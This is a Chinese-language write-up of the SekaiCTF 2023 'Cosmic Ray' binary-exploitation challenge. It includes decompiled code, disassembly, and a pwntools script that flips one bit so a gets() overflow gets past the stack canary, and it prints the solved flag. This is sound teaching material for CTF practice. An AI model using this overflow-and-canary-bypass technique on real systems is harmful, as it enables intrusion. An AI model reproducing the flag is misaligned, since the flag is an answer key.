## 描述

- 分类: binary exploitation
- 链接: https://ctf.sekai.team/challenges#Cosmic-Ray-40
- 难度: 1 star (初级)

```
Why wait for the universe to send you a cosmic ray when you can do it yourself?
 Well today the wait is over with our brand new cosmic ray launcher 3000 coming
 to a CPU near you!

This technology is still under development, please leave a review when you are 
finished testing.

Author: Rench
```

翻译：我们的最新科技可以帮你发送宇宙射线，请使用后给个好评。

题目提供了可执行二进制文件。要获得flag，需要连接远程服务并渗透。

## 解决

(把二进制重命名为 "cosmicray")

首先，先看一下编译的参数（使用了一个叫pwntools的Python库）

```bash
harryfyx@DESKTOP-QADD3OA:/mnt/d/sekaictf2023/cosmic ray/dist$ checksec cosmicray
[*] '/mnt/d/sekaictf2023/cosmic ray/dist/cosmicray'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

我们看到有栈溢出保护，栈地址是随机的，而且栈不可执行。

用Ghidra反编译这个文件，我们看到main函数（重命名了一些变量和函数名），以及获取flag的win函数。

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  longlong user;
  char user2 [40];
  long local_10;
  
  local_10 = *(in_FS_OFFSET + 0x28);
  setbuf(stdout,0x0);
  puts("Welcome to my revolutionary new cosmic ray machine!");
  puts("Give me any address in memory and I\'ll send a cosmic ray through it:");
  __isoc99_scanf("0x%lx",&user);
  getchar();
  cosmic_ray(user);
  puts("Please write a review of your experience today:");
  gets(user2);  // vulnerable!
  if (local_10 != *(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

void win(void)
{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(in_FS_OFFSET + 0x28);
  __stream = fopen("flag.txt","r");
  fgets(local_58,0x40,__stream);
  puts(local_58);
  if (local_10 != *(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

因为gets会造成栈溢出，我们可以控制程序返回到win函数。但是，stack canary会检测到栈溢出而退出程序。

幸好，我们可以用宇宙射线反转一个bit，然后跳过stack canary检测。

我们用Ghidra看main函数的反编译。

```assembly
                      **************************************************************
                      *                          FUNCTION                          *
                      **************************************************************
                      undefined main()
      undefined         AL:1           <RETURN>
      undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     0040165e(W), 
                                                                                            004016e7(R)  
      undefined1[40]    Stack[-0x38]   user2                                   XREF[1]:     004016d1(*)  
      longlong          Stack[-0x40]:8 user                                    XREF[2]:     00401696(*), 
                                                                                            004016b6(R)  
                      main                                            XREF[5]:     Entry Point(*), 
                                                                                  _start:00401208(*), 
                                                                                  _start:00401208(*), 004021bc, 
                                                                                  004022f0(*)  
00401649 f3 0f 1e fa     ENDBR64
0040164d 55              PUSH       RBP
0040164e 48 89 e5        MOV        RBP,RSP
00401651 48 83 ec 40     SUB        RSP,0x40
00401655 64 48 8b        MOV        RAX,qword ptr FS:[0x28]
          04 25 28 
          00 00 00
0040165e 48 89 45 f8     MOV        qword ptr [RBP + local_10],RAX
00401662 31 c0           XOR        EAX,EAX
00401664 48 8b 05        MOV        RAX,qword ptr [stdout]
          2d 2a 00 00
0040166b be 00 00        MOV        ESI,0x0
          00 00
00401670 48 89 c7        MOV        RDI,RAX
00401673 e8 c8 fa        CALL       libc.so.6::setbuf                                void setbuf(FILE * __stream, cha
          ff ff
00401678 48 8d 05        LEA        RAX,[s_Welcome_to_my_revolutionary_new_c_00402   = "Welcome to my revolutionary n
          31 0a 00 00
0040167f 48 89 c7        MOV        RDI=>s_Welcome_to_my_revolutionary_new_c_00402   = "Welcome to my revolutionary n
00401682 e8 89 fa        CALL       libc.so.6::puts                                  int puts(char * __s)
          ff ff
00401687 48 8d 05        LEA        RAX,[s_Give_me_any_address_in_memory_an_004020   = "Give me any address in memory
          5a 0a 00 00
0040168e 48 89 c7        MOV        RDI=>s_Give_me_any_address_in_memory_an_004020   = "Give me any address in memory
00401691 e8 7a fa        CALL       libc.so.6::puts                                  int puts(char * __s)
          ff ff
00401696 48 8d 45 c8     LEA        RAX=>user,[RBP + -0x38]
0040169a 48 89 c6        MOV        RSI,RAX
0040169d 48 8d 05        LEA        RAX,[s_0x%lx_0040212d]                           = "0x%lx"
          89 0a 00 00
004016a4 48 89 c7        MOV        RDI=>s_0x%lx_0040212d,RAX                        = "0x%lx"
004016a7 b8 00 00        MOV        EAX,0x0
          00 00
004016ac e8 1f fb        CALL       libc.so.6::__isoc99_scanf                        undefined __isoc99_scanf()
          ff ff
004016b1 e8 da fa        CALL       libc.so.6::getchar                               int getchar(void)
          ff ff
004016b6 48 8b 45 c8     MOV        RAX,qword ptr [RBP + user]
004016ba 48 89 c7        MOV        RDI,RAX
004016bd e8 e3 fd        CALL       cosmic_ray                                       undefined cosmic_ray(undefined8 
          ff ff
004016c2 48 8d 05        LEA        RAX,[s_Please_write_a_review_of_your_ex_004021   = "Please write a review of your
          6f 0a 00 00
004016c9 48 89 c7        MOV        RDI=>s_Please_write_a_review_of_your_ex_004021   = "Please write a review of your
004016cc e8 3f fa        CALL       libc.so.6::puts                                  int puts(char * __s)
          ff ff
004016d1 48 8d 45 d0     LEA        RAX=>user2,[RBP + -0x30]
004016d5 48 89 c7        MOV        RDI,RAX
004016d8 b8 00 00        MOV        EAX,0x0
          00 00
004016dd e8 be fa        CALL       libc.so.6::gets                                  char * gets(char * __s)
          ff ff
004016e2 b8 00 00        MOV        EAX,0x0
          00 00
004016e7 48 8b 55 f8     MOV        RDX,qword ptr [RBP + local_10]
004016eb 64 48 2b        SUB        RDX,qword ptr FS:[0x28]
          14 25 28 
          00 00 00
004016f4 74 05           JZ         LAB_004016fb
004016f6 e8 35 fa        CALL       libc.so.6::__stack_chk_fail                      undefined __stack_chk_fail()
          ff ff
                      -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```

地址`004016f4`的指令会在检测到栈溢出的时候，进入__stack_chk_fail。我们把它改成检测到栈溢出的时候依然正常返回，因为其字节码只有1bit之差。

```
        004016f4 75 05           JNZ        LAB_004016fb
```

所以，把所有都串起来，我们用以下脚本。

```Py
import pwn

elf = pwn.ELF("./cosmicray")
# p = elf.process()
p = pwn.connect('chals.sekai.team', 4077)

pwn.context.binary = elf
pwn.context.log_level = 'debug'

p.recvuntil(b"Give me any address in memory and I'll send a cosmic ray through it:")
p.sendline(b"0x4016f4")

p.recvuntil(b"Enter a bit position to flip (0-7):")
p.sendline(b'7')

p.recvuntil(b'Please write a review of your experience today:')
ret_override = 0x004012d6

payload = b'a' * (40 + 8 + 8) + pwn.p64(ret_override)
p.sendline(payload)  # this will send the pc back to middle of main so we can change other bits
p.recvall()
```

从打印结果看到，flag是`SEKAI{w0w_pwn_s0_ez_wh3n_I_can_s3nd_a_c05m1c_ray_thru_ur_cpu}`